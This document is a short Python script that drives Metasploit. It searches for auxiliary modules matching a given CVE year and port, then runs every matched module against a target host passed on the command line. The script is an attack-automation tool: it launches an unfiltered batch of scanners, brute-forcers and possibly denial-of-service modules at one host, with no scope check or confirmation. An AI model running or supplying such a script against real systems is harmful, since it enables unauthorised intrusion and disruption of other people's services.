import subprocess
import sys

cve_year = sys.argv[1]
target = sys.argv[2]
port = sys.argv[3]


def run(cve_year, target, port):
    command = "rm -rf tmp/"
    subprocess.call(command.split())
    command = "mkdir tmp"
    subprocess.call(command.split())

    print("Starting search...")

    with open("tmp/search.rc", "w") as f:
        f.write("spool tmp/search.txt\n")
        f.write("search cve:" + cve_year + " port:" + port + " type:auxiliary\n")
        f.write("spool off\n")
        f.write("exit\n")

    command = "msfconsole -r tmp/search.rc"
    subprocess.call(command.split())

    with open('tmp/search.txt', 'r') as f:
        output = f.read()
        auxilaries = []
        for line in output.split():
            if "auxiliary/" in line:
                auxilaries.append(line)

    print("Starting exploit...")

    with open('tmp/exploit.rc', 'w') as f:
        f.write("spool tmp/exploit.txt\n")
        for item in auxilaries:
            f.write(f"use {item}\n")
            f.write(f"set RHOSTS {target}\n")
            f.write("run\n")
        f.write("spool off\n")
        f.write("exit")

    command = "msfconsole -r tmp/exploit.rc"
    subprocess.call(command.split())



run(cve_year, target, port)